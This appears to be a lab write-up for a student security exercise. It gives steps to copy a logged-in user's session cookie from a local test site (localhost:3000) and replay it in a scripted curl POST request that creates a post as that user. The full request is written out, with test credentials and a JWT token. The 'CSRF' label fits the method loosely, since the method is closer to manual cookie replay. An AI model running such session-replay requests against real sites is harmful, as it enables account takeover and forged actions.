CSRF attack instructions:
1. login to site (you can use the following info - username: User1, password: user1pass)
2. press F12, navigate to cookies
3. copy value of cookie named loginDetails
4. run the CSRFattack.js script with "node CSRFattack.js"
5. paste the copied cookie value into the prompt given
6. press enter
7. navigate to my drafts on the logged in site
8. a post made by the attack should be there


note - the CSRFattack.js script simply takes the cookie value and, formats it correctly into a curl command as seen in the logrocket blog.
the curl should look like - 
curl -X POST "http://localhost:3000/api/post" 
-H "Content-Type: application/json" 
-H "Cookie: loginDetails={\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InVzZXIxQGV4YW1wbGUuY29tIiwidXNlcm5hbWUiOiJVc2VyMSIsIm5hbWUiOiJVc2VyMSIsImlkIjoyLCJpbWFnZSI6bnVsbH0.I9EWAawj6rSPHgysehuxgfg36Yfzf9EUbpfMDJJkayc\",\"username\":\"User1\",\"name\":\"User1\",\"userId\":2,\"email\":\"user1@example.com\",\"image\":null}" 
-d "{\"title\": \"attacker title\",\"content\": \"attacker content\",\"loginDetails\": {\"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InVzZXIxQGV4YW1wbGUuY29tIiwidXNlcm5hbWUiOiJVc2VyMSIsIm5hbWUiOiJVc2VyMSIsImlkIjoyLCJpbWFnZSI6bnVsbH0.I9EWAawj6rSPHgysehuxgfg36Yfzf9EUbpfMDJJkayc\",\"username\": \"User1\",\"name\": \"User1\",\"userId\": 2,\"email\": \"user1@example.com\",\"image\": null}}"

